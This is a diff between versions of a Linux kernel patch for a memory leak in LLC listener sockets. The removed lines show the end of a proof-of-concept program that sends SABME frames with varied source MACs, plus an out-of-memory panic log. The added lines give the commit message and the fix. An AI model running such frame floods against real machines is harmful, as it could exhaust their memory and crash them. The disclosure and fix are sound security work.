-		mode, rx_if, tx_if, (unsigned long long)count);
-
-	if (!strcmp(mode, "accept")) {
-		int child;
-		struct sockaddr_llc addr;
-		socklen_t addrlen = sizeof(addr);
-		struct timeval tv = { .tv_sec = 5, .tv_usec = 0 };
-
-		fill_src_mac(src_mac, 1);
-		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
-			src_mac[ETH_ALEN - 1] ^= 1;
-		send_sabme(packet_fd, ifindex, dst_mac, src_mac);
-		setsockopt(listener_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
-		child = accept(listener_fd, (struct sockaddr *)&addr, &addrlen);
-		if (child < 0)
-			die_errno("accept(AF_LLC)");
-		printf("SABME passive open accepted\naccept_rc=0\n");
-		close(child);
-		close(packet_fd);
-		close(listener_fd);
-		return 0;
-	}
-
-	if (!strcmp(mode, "close")) {
-		for (i = 1; i <= count; i++) {
-			fill_src_mac(src_mac, i);
-			if (!memcmp(src_mac, dst_mac, ETH_ALEN))
-				src_mac[ETH_ALEN - 1] ^= 1;
-			send_sabme(packet_fd, ifindex, dst_mac, src_mac);
-		}
-		close(packet_fd);
-		close(listener_fd);
-		printf("SABME sent without accept and listener closed\n");
-		return 0;
-	}
-
-	usage(argv[0]);
-	return EXIT_FAILURE;
-}
-------END poc-sabme.c--------
-
-------BEGIN leak sample------
-The original leak-only oracle on the unfixed kernel was a line count of
-/proc/net/llc/socket, not a preserved cat of that table. After 100 DISC
-frames, and after the listener process had already exited:
-
-  wc -l /proc/net/llc/socket
-  before: 0 leftover LLC sockets
-  after 100 frames: 100 leftover entries remained
-
-No raw 100-row proc table from that run was kept. The panic_on_oom log
-below is the later 110000-frame exhaustion of the 2 GB guest, not the
-leak oracle itself.
-------END leak sample--------
-
-----BEGIN crash log----
-[ 1665.704541][T10284] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled
-
-[ 1665.705358][T10284] CPU: 0 UID: 0 PID: 10284 Comm: poc Not tainted 6.12.74 #3
-
-[ 1665.705911][T10284] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-
-[ 1665.706676][T10284] Call Trace:
-
-[ 1665.706943][T10284]  <TASK>
-
-[1665.707181][T10284] dump_stack_lvl (lib/dump_stack.c:118 (discriminator 3))
-
-[1665.707568][T10284] panic (kernel/panic.c:611)
-
-[1665.707918][T10284] ? dump_header (arch/x86/include/asm/atomic64_64.h:15 include/linux/atomic/atomic-arch-fallback.h:2583 include/linux/atomic/atomic-long.h:38 include/linux/atomic/atomic-instrumented.h:3189 include/linux/vmstat.h:196 include/linux/vmstat.h:208 mm/oom_kill.c:183 mm/oom_kill.c:473)
-
-[1665.708305][T10284] ? __pfx_panic (kernel/panic.c:288)
-
-[1665.708678][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182)
-
-[1665.709132][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182)
-
-[1665.709616][T10284] ? out_of_memory (mm/oom_kill.c:1158 (discriminator 1))
-
-[1665.710024][T10284] out_of_memory (mm/oom_kill.c:1158 (discriminator 1))
-
-[1665.710435][T10284] ? __pfx_out_of_memory (mm/oom_kill.c:1114)
-
-[1665.710868][T10284] ? lock_acquire+0x2f/0xb0
-
-[1665.711243][T10284] ? __alloc_pages_noprof (mm/page_alloc.c:4188 mm/page_alloc.c:4478 mm/page_alloc.c:4839)
-
-[1665.711712][T10284] __alloc_pages_noprof (include/linux/vmstat.h:236 (discriminator 1) mm/page_alloc.c:4201 (discriminator 1) mm/page_alloc.c:4478 (discriminator 1) mm/page_alloc.c:4839 (discriminator 1))
-
-[1665.712184][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182)
-
-[1665.712658][T10284] ? hlock_class+0x4e/0x130
-
-[1665.713041][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182)
-
-[1665.713501][T10284] ? __pfx___alloc_pages_noprof (mm/page_alloc.c:4792)
-
-[1665.713991][T10284] ? __pfx___lock_acquire+0x10/0x10
-
-[1665.714431][T10284] ? __sanitizer_cov_trace_switch+0x54/0x90
-
-[1665.714917][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182)
-
-[1665.715381][T10284] ? policy_nodemask (mm/mempolicy.c:1865 (discriminator 1) mm/mempolicy.c:2066 (discriminator 1))
-
-[1665.715788][T10284] alloc_pages_mpol_noprof (include/linux/mm.h:1637)
-
-[1665.716246][T10284] ? __pfx_alloc_pages_mpol_noprof (mm/mempolicy.c:2227)
-
-[1665.716734][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182)
-
-[1665.717194][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182)
-
-[1665.717656][T10284] ? xas_load (lib/xarray.c:243)
-
-[1665.718005][T10284] ? filemap_get_entry (mm/filemap.c:1850)
-
-[1665.718439][T10284] folio_alloc_noprof (include/linux/instrumented.h:68 include/asm-generic/bitops/instrumented-non-atomic.h:141 include/linux/page-flags.h:829 include/linux/page-flags.h:850 mm/internal.h:703 mm/internal.h:699 mm/mempolicy.c:2356)
-
-[1665.718847][T10284] filemap_alloc_folio_noprof (mm/filemap.c:1511)
-
-[1665.719316][T10284] ? __pfx_filemap_alloc_folio_noprof (mm/filemap.c:996)
-
-[1665.719803][T10284] ? filemap_fault (include/linux/instrumented.h:68 include/asm-generic/bitops/instrumented-non-atomic.h:141 include/linux/page-flags.h:562 mm/filemap.c:3241 mm/filemap.c:3342)
-
-[1665.720231][T10284] __filemap_get_folio (mm/filemap.c:3818)
-
-[1665.720683][T10284] filemap_fault (mm/internal.h:1002 mm/filemap.c:3242 mm/filemap.c:3342)
-
-[1665.721097][T10284] ? __pfx_filemap_fault (mm/filemap.c:3315)
-
-[1665.721534][T10284] ? do_pte_missing+0x165a/0x3ff0
-
-[1665.721944][T10284] ? __pfx_lock_release+0x10/0x10
-
-[1665.722375][T10284] ? __pfx_filemap_map_pages (mm/filemap.c:3645)
-
-[1665.722813][T10284] __do_fault (mm/memory.c:4887)
-
-[1665.723172][T10284] ? __pfx_filemap_map_pages (mm/filemap.c:3645)
-
-[1665.723621][T10284] do_pte_missing+0x174c/0x3ff0
-
-[1665.724026][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182)
-
-[1665.724482][T10284] ? reacquire_held_locks+0x20b/0x4c0
-
-[1665.724932][T10284] ? lock_vma_under_rcu (include/linux/mm.h:718 (discriminator 2) mm/memory.c:6266 (discriminator 2))
-
-[1665.725374][T10284] __handle_mm_fault (mm/memory.c:4791 mm/memory.c:3963 mm/memory.c:5789 mm/memory.c:5932)
-
-[1665.725805][T10284] ? __pfx_lock_release+0x10/0x10
-
-[1665.726207][T10284] ? down_read_trylock (kernel/locking/rwsem.c:1604)
-
-[1665.726640][T10284] ? __pfx___handle_mm_fault (mm/memory.c:5841)
-
-[1665.727085][T10284] ? __pfx_down_read_trylock (kernel/locking/rwsem.c:1562)
-
-[1665.727574][T10284] ? __pfx_lock_vma_under_rcu (mm/memory.c:6256)
-
-[1665.728053][T10284] handle_mm_fault (mm/memory.c:2943)
-
-[1665.728479][T10284] do_user_addr_fault (arch/x86/mm/fault.c:441 arch/x86/mm/fault.c:1230)
-
-[1665.728921][T10284] exc_page_fault (arch/x86/include/asm/irqflags.h:37 arch/x86/include/asm/irqflags.h:114 arch/x86/mm/fault.c:1485 arch/x86/mm/fault.c:1534)
-
-[1665.729305][T10284] asm_exc_page_fault (arch/x86/include/asm/idtentry.h:623)
-
-[ 1665.729700][T10284] RIP: 0033:0x559e433ce5cb
-
-[ 1665.730065][T10284] Code: Unable to access opcode bytes at 0x559e433ce5a1.
-
-[ 1665.730594][T10284] RSP: 002b:00007ffcc17c93f0 EFLAGS: 00010206
-
-[ 1665.731148][T10284] RAX: 000000000000003c RBX: 00007ffcc17c9418 RCX: 0000559e433d10c6
-
-[ 1665.731733][T10284] RDX: 000000000000002c RSI: 0000559e433d10c0 RDI: 0000000000000004
-
-[ 1665.732318][T10284] RBP: 00007ffcc17c9412 R08: 00007ffcc17c9420 R09: 0000000000000014
-
-[ 1665.732904][T10284] R10: 0000000000000000 R11: 0000000000000202 R12: 0000559e433d10c6
-
-[ 1665.733491][T10284] R13: d288ce703afb7e91 R14: 0000000000019194 R15: 0000000000000004
-
-[ 1665.734120][T10284]  </TASK>
------END crash log-----
-
+llc_conn_handler() creates a child socket for every frame that matches
+a listening PF_LLC socket. llc_create_incoming_sock() publishes the
+child in the SAP tables and takes a device reference before the frame
+is known to be a passive-open request.
+
+A listener-directed non-SABME frame does not queue an LLC_CONN_PRIM
+indication, so accept() cannot return the child and closing the listener
+does not reclaim it.
+Repeating such frames, for example DISC commands with distinct source
+addresses, can leak struct sock objects and device references and
+eventually exhaust memory.
+
+Create an incoming child only for a SABME command. Answer DISC commands
+and other P=1 commands with a DM response addressed to the source address
+decoded from the packet, because a listener has no peer in llc->daddr.
+Drop other non-SABME frames. Do not dispatch non-SABME frames through the
+listening socket's ADM state machine; its catch-all would move the listener
+to LLC_CONN_OUT_OF_SVC.
+
+The existing SABME child lifecycle is unchanged; this patch addresses
+only the non-SABME path.
+
+Fixes: 1da177e4c3f4 ("Linux-2.6.12-rc2")
+Cc: stable@vger.kernel.org
+Reported-by: Vega <vega@nebusec.ai>
+Assisted-by: LLM
+Co-developed-by: Luxing Yin <root@tr0jan.top>
+Signed-off-by: Luxing Yin <root@tr0jan.top>
+Signed-off-by: Zihan Xi <zihanx@nebusec.ai>
+---
 changes in v9:
   - Simplify the fix to cover only the non-SABME listener leak:
     create children only for SABME, answer DISC and P=1 commands with
@@ -902,15 +244,81 @@ changes in v2:
   - Clarify panic_on_oom crash evidence and packetdrill selection.
   - v1 Link: https://lore.kernel.org/all/cover.1784725007.git.zihanx@nebusec.ai/
 
-Best regards,
-Zihan Xi
-
-Zihan Xi (1):
-  llc: fix listener child socket leak on non-SABME frames
-
  net/llc/llc_conn.c | 53 ++++++++++++++++++++++++++++++++++++++++++----
  1 file changed, 49 insertions(+), 4 deletions(-)
 
+diff --git a/net/llc/llc_conn.c b/net/llc/llc_conn.c
+index 260460d50f54c..4c2ca6b842516 100644
+--- a/net/llc/llc_conn.c
++++ b/net/llc/llc_conn.c
+@@ -771,6 +771,36 @@ static struct sock *llc_create_incoming_sock(struct sock *sk,
+ 	return newsk;
+ }
+ 
++/**
++ *	llc_listener_send_dm - DM reply from a listening socket
++ *	@sap: SAP of the listener
++ *	@skb: received command
++ *	@saddr: source address decoded from @skb
++ *	@f_bit: final bit for the DM response
++ *
++ *	ADM would answer DISC and P=1 commands with DM, but a listener has no
++ *	peer in llc->daddr. Build the reply from the incoming frame instead.
++ */
++static void llc_listener_send_dm(struct llc_sap *sap, struct sk_buff *skb,
++				 const struct llc_addr *saddr, u8 f_bit)
++{
++	struct sk_buff *nskb;
++	int rc;
++
++	nskb = llc_alloc_frame(NULL, skb->dev, LLC_PDU_TYPE_U, 0);
++	if (!nskb)
++		return;
++
++	llc_pdu_header_init(nskb, LLC_PDU_TYPE_U, sap->laddr.lsap,
++			    saddr->lsap, LLC_PDU_RSP);
++	llc_pdu_init_as_dm_rsp(nskb, f_bit);
++	rc = llc_mac_hdr_init(nskb, skb->dev->dev_addr, saddr->mac);
++	if (unlikely(rc))
++		kfree_skb(nskb);
++	else
++		dev_queue_xmit(nskb);
++}
++
+ void llc_conn_handler(struct llc_sap *sap, struct sk_buff *skb)
+ {
+ 	struct llc_addr saddr, daddr;
+@@ -795,11 +825,26 @@ void llc_conn_handler(struct llc_sap *sap, struct sk_buff *skb)
+ 	 * in the newly created struct sock private area. -acme
+ 	 */
+ 	if (unlikely(sk->sk_state == TCP_LISTEN)) {
+-		struct sock *newsk = llc_create_incoming_sock(sk, skb->dev,
+-							      &saddr, &daddr);
+-		if (!newsk)
++		struct sock *newsk;
++
++		if (!llc_conn_ev_rx_sabme_cmd_pbit_set_x(sk, skb)) {
++			newsk = llc_create_incoming_sock(sk, skb->dev, &saddr,
++							 &daddr);
++			if (!newsk)
++				goto drop_unlock;
++			skb_set_owner_r(skb, newsk);
++		} else {
++			/* Not a passive-open request. */
++			if (!llc_conn_ev_rx_disc_cmd_pbit_set_x(sk, skb)) {
++				u8 f_bit;
++
++				llc_pdu_decode_pf_bit(skb, &f_bit);
++				llc_listener_send_dm(sap, skb, &saddr, f_bit);
++			} else if (!llc_conn_ev_rx_xxx_cmd_pbit_set_1(sk, skb)) {
++				llc_listener_send_dm(sap, skb, &saddr, 1);
++			}
+ 			goto drop_unlock;
+-		skb_set_owner_r(skb, newsk);
++		}
+ 	} else {
+ 		/*
+ 		 * Can't be skb_set_owner_r, this will be done at the
 -- 
 2.43.0
 
